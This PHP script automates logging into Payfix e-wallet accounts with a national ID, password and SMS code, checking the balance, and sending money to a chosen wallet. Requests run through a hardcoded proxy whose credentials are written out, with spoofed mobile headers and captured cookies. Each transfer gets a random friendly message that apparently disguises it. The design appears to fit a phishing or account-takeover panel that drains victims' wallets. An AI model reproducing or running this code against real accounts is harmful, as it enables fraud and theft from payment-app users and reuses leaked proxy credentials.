<?php

include 'inc/config.php';



function login($turkeyId, $password){
    
    
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, 'https://bireysel.payfix.com.tr/highway/api/User/GetToken');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array(
        'password' => $password,
        'rememberMe' => false,
        'turkeyId' => $turkeyId
    )));
    
    $headers = array(
        'Content-Type: application/json;charset=UTF-8',
        'referer: https://bireysel.payfix.com.tr/',
        'authority: bireysel.payfix.com.tr',
        'accept: application/json, text/plain, */*',
        'accept-language: en-GB,en;q=0.5',
        'cookie: __cf_bm=E0IYG1OwTYpHN5CPFxCtZs4vHRwhblglF0_Kozq.tXg-1694175586-0-AczKcyMBorwDzrXnsR0G1YukYLZSvs0K/ovRO+5syP8w06yIYAId9EVma84BiY0D91DRGwvdwR36BQOPai+0LJc=',
        'origin: https://bireysel.payfix.com.tr',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'sec-gpc: 1',
        'strict-transport-security: max-age=31536000; includeSubDomains; preload',
        'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
    );
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $proxy = '213.74.97.210:808';
    $proxy_auth = 'PwzjVF:BCk5aD';
    
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_auth);
    
    $result = curl_exec($ch);
    
    if (curl_errno($ch)) {
        echo 'Curl Hata: ' . curl_error($ch);
    }
    
    return json_decode($result, true); 
    
    curl_close($ch);
    
    }




function sms($userTokenId, $code) {
    $ch = curl_init();

    $headers = array(
        'authority: bireysel.payfix.com.tr',
        'accept: application/json, text/plain, */*',
        'accept-language: en-GB,en;q=0.5',
        'authorization: Bearer ' . $userTokenId,
        'content-type: application/json;charset=UTF-8',
        'cookie: __cf_bm=J.dHrOGhmQwYm48ZZwNpO08pDVH0l.POIW4k6hFcH2I-1694181181-0-AXxfNlx8tcYyhLPxAUj7GtIzkYAur0ExpqaNovlu0YsMmOkhg100GmXO0hakSKrWQbUVXJ8GQRBCcYEljxmf9vI=',
        'origin: https://bireysel.payfix.com.tr',
        'referer: https://bireysel.payfix.com.tr/',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'sec-gpc: 1',
        'strict-transport-security: max-age=31536000; includeSubDomains; preload',
        'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
    );

    $data = json_encode(array(
        'userTokenId' => $userTokenId,
        'code' => $code
    ));

    curl_setopt($ch, CURLOPT_URL, 'https://bireysel.payfix.com.tr/highway/api/User/GetVerifyToken');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	$proxy = '213.74.97.210:808';
    $proxy_auth = 'PwzjVF:BCk5aD';
    
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_auth);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');

    $result = curl_exec($ch);

    if (curl_errno($ch)) {
        return 'Curl Hata: ' . curl_error($ch);
    }

    curl_close($ch);
    return json_decode($result, true);
}
function balance($accessToken) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'https://bireysel.payfix.com.tr/highway/Payment/api/UserWalletTransactions/GetDashBoard');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'authority: bireysel.payfix.com.tr',
        'accept: application/json, text/plain, */*',
        'accept-language: en-GB,en;q=0.5',
        'authorization: Bearer ' . $accessToken,
        'content-length: 0',
        'cookie: __cf_bm=Qw6MPqoFuc65bLHO8HPKbd2ZQ.b.JDV5.EnC2m8gvc4-1694189782-0-AdCsPoOq0f8BSpvrdDLxzt62OZC42qDIy1xgLbStqkwLPZC6PlPLdkidb8pHWw8oifgYw/in9hgwPSzHakP28as=',
        'origin: https://bireysel.payfix.com.tr',
        'referer: https://bireysel.payfix.com.tr/home',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'sec-gpc: 1',
        'strict-transport-security: max-age=31536000; includeSubDomains; preload',
        'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
    ));
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate'); 
	$proxy = '213.74.97.210:808';
    $proxy_auth = 'PwzjVF:BCk5aD';
    
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_auth);
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        throw new Exception('cURL error: ' . curl_error($ch));
    }

    curl_close($ch);

    return json_decode($response, true);
}
function sendMoney($accessToken, $walletNo, $amount) {
    $url = 'https://bireysel.payfix.com.tr/highway/Payment/api/UserWalletTransactions/SendMoney';

    $headers = [
        'authority: bireysel.payfix.com.tr',
        'accept: application/json, text/plain, */*',
        'accept-language: en-GB,en;q=0.5',
        'authorization: Bearer ' . $accessToken,
        'content-type: application/json;charset=UTF-8',
        'origin: https://bireysel.payfix.com.tr',
        'referer: https://bireysel.payfix.com.tr/send-money',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'sec-gpc: 1',
        'strict-transport-security: max-age=31536000; includeSubDomains; preload',
        'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
    ];
    $randomMessages =  ["Gunun guzel gecsin","Dogum gunun kutlu olsun","Harika bir gun dilerim","Bugunun en iyisi ol","Basarilar dilerim","Yeni baslangiclara merhaba de","Gulumsemekten vazgecme","Hayatin tadini cikar","Daima ileriye bak","Her anin kiymetini bil"];

    $description = $randomMessages[rand(0, count($randomMessages) - 1)];

    $data = [
        'amount' => $amount,
        'description' => $description,
        'tabIndex' => 3,
        'walletNo' => $walletNo
        
        
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$proxy = '213.74.97.210:808';
    $proxy_auth = 'PwzjVF:BCk5aD';
    
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_auth);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        return 'Curl error: ' . curl_error($ch);
    }

    curl_close($ch);
    
    return json_decode($response, true);
}


?>
